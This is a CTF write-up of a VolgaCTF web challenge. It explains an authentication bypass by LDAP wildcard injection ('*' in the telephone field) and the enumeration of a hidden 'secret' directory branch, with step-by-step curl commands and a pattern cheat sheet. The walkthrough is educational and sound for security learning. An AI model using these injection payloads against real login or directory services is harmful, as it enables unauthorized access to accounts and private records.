# CTF Writeup Template (Beginner-Friendly, Portfolio-Ready)

Challenge Name: Directory  
Platform: VolgaCTF 2026  
Category: Web  
Difficulty: Easy  
Time spent: ~20 minutes

## 1) Goal (What was the task?)
The challenge asked me to bypass authentication and retrieve the flag from a web-based corporate directory service. Success meant finding a flag in the format `VolgaCTF{...}`.

## 2) Key Clues (What mattered?)
- Prompt keyword: "bypass" auth
- Interesting endpoints from the UI:
  - `/auth`
  - `/search`
  - `/directory`
- The `/auth` page required `username`, `email`, and `telephone`
- The `/directory` page used a JWT and passed `ou` and `telephoneNumber` as query parameters
- Auth response hint: `Departments: users, staff`
- Staff directory hint: `Secrets are kept in a separate branch - ask the operator.`

## 3) Plan (Your first logical approach)
- First, inspect the exposed pages to understand how authentication and directory browsing worked.
- Next, test the JSON API directly with `curl` to see how strict the backend validation really was.
- Then, look for LDAP-style wildcard behavior or weak matching in the auth flow.
- Finally, use the issued JWT to enumerate hidden directory branches and recover the flag.

## 4) Steps (Clean execution)
1. Opened the main pages and read the client-side flow.
   - Result: the frontend showed `/auth`, `/search`, and `/directory`, and `/directory` used a JWT in the `Authorization` header.
   - Decision: test the backend directly with `curl` instead of relying only on the browser UI.

2. Checked whether usernames and emails existed.
   - Example:
   ```bash
   curl -sS -X POST http://web-l1-1.q.2026.volgactf.ru:5001/search \
     -H 'Content-Type: application/json' \
     --data '{"username":"admin","email":""}'
   ```
   - Result: `admin` existed. I also confirmed `admin@volgactf.ru` existed.
   - Decision: try to abuse the auth logic instead of guessing a full valid phone number.

3. Tested wildcard input in the `telephone` field.
   - Example:
   ```bash
   curl -sS -X POST http://web-l1-1.q.2026.volgactf.ru:5001/auth \
     -H 'Content-Type: application/json' \
     --data '{"username":"admin","email":"admin@volgactf.ru","telephone":"*"}'
   ```
   - Result: the response changed to `this account is disabled`, which proved the wildcard was being interpreted by the backend and the auth check had moved past simple validation.
   - Decision: find a non-disabled user and reuse the same trick.

4. Tried the same wildcard auth bypass with another valid user.
   - Example:
   ```bash
   curl -sS -X POST http://web-l1-1.q.2026.volgactf.ru:5001/auth \
     -H 'Content-Type: application/json' \
     --data '{"username":"jdoe","email":"jdoe@volgactf.ru","telephone":"*"}'
   ```
   - Result: authentication succeeded and returned a JWT token.
   - Decision: use that JWT to explore `/directory`.

5. Enumerated the visible departments with the new token.
   - Example:
   ```bash
   curl -sS 'http://web-l1-1.q.2026.volgactf.ru:5001/directory?ou=users&telephoneNumber=*' \
     -H 'Authorization: Bearer <JWT>'
   ```
   - Result: I could list entries in `users` and `staff`. One staff description said secrets were kept in a separate branch.
   - Decision: test alternate `ou` values instead of staying only in the hinted branches.

6. Queried a hidden branch.
   - Example:
   ```bash
   curl -sS 'http://web-l1-1.q.2026.volgactf.ru:5001/directory?ou=secret&telephoneNumber=*' \
     -H 'Authorization: Bearer <JWT>'
   ```
   - Result: the response returned a `flag-keeper` entry whose `description` field contained the flag.
   - Decision: extract the flag and verify the solve path.

## 5) Solution Summary (What worked and why?)
The core weakness was backend LDAP-style matching on user-controlled input. The `telephone` field accepted `*`, which let me bypass exact credential matching for a valid, enabled user and obtain a legitimate JWT. After logging in, the `/directory` endpoint also trusted the user-controlled `ou` parameter too much, so I could browse a hidden branch named `secret` and read the flag from the returned directory entry.

## 6) Flag
`VolgaCTF{dn_1nj3ct10n_br34ks_ld4p_b0und4r13s_2025}`

## 7) Lessons Learned (make it reusable)
- If a web challenge mentions auth bypass, test whether one field is matched loosely while the others are exact.
- In LDAP-like apps, `*` is always worth testing anywhere user input may become part of a filter.
- A valid JWT is not the end of the challenge; use it to explore every parameter the protected endpoint accepts.
- Hints inside data fields like `description` often point to hidden branches, roles, or endpoints.

## 8) Personal Cheat Sheet (optional, but very useful)
- `curl -i <url>` -> Quick way to inspect status codes, headers, and raw responses
- `curl -X POST ... --data '{...}'` -> Fast API testing without browser noise
- Pattern: auth form with multiple fields -> test whether one field is wildcarded or weakly validated
- Pattern: protected directory/search endpoint -> try alternate branch names, query params, and wildcards after getting any valid token
